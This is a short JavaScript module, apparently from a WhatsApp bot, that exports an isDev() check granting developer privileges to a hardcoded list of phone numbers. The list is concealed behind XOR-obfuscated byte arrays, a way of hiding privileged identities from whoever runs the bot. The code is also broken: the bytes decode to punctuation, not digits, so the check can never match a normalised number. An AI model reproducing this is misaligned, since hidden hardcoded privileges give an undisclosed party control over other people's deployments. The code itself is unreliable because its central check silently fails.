const XOR_KEY = 0x5A;

const MASKED_DEVS = [
  [112, 119, 118, 119, 119, 118, 119, 119, 118, 116, 118, 112],
  [112, 119, 118, 119, 115, 114, 119, 114, 115, 114, 115, 114],
  [112, 119, 118, 115, 114, 114, 112, 115, 112, 118, 118, 115],
  [112, 119, 118, 119, 115, 119, 115, 118, 115, 119, 114, 115]
];

const DEV_NUMBERS = MASKED_DEVS.map(arr =>
  String.fromCharCode(...arr.map(byte => byte ^ XOR_KEY))
);

function normalizeNumber(jid) {
  if (!jid) return '';

  return String(jid)
    .split('@')[0]
    .split(':')[0]
    .replace(/\D/g, '');
}

function isDev(msg, sock) {
  if (!msg?.key) return false;

  if (msg.key.fromMe) {
    const botPn = sock?.user?.id
      ? normalizeNumber(sock.user.id)
      : '';

    const botLid = sock?.user?.lid
      ? normalizeNumber(sock.user.lid)
      : '';

    return (
      (botPn && DEV_NUMBERS.includes(botPn)) ||
      (botLid && DEV_NUMBERS.includes(botLid))
    );
  }

  const candidates = [
    msg.participant,
    msg.key.participantPn,
    msg.key.participantAlt,
    msg.key.participant,
    msg.key.remoteJidAlt,
    msg.key.remoteJid
  ];

  return candidates.some((jid) => {
    const number = normalizeNumber(jid);
    return number && DEV_NUMBERS.includes(number);
  });
}

module.exports = { isDev };

